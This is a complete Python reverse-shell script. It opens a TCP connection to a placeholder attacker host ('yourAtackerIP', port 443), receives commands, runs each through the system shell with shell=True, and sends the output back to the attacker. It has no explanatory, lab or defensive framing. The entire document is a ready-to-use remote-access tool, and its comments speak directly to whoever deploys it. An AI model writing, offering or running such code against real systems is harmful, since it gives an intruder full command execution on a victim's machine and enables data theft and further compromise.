import socket
import subprocess

LHOST = "yourAtackerIP"
LPORT = 443  #Or the one you preffer
BUFFER_SIZE = 1024

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((LHOST, LPORT))

while True:
    try:
        data = client.recv(BUFFER_SIZE)
        if not data: 
            break
        
        code = data.decode("utf-8").strip()
        
        if len(code) > 1:
            try: 
                output = subprocess.check_output(code, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as subprocess_error:
                output = str(subprocess_error).encode("utf-8")
            
            client.send(output)
    except Exception as connection_error:
        client.send(f"Connection error: {connection_error}".encode("utf-8"))
        
client.close()
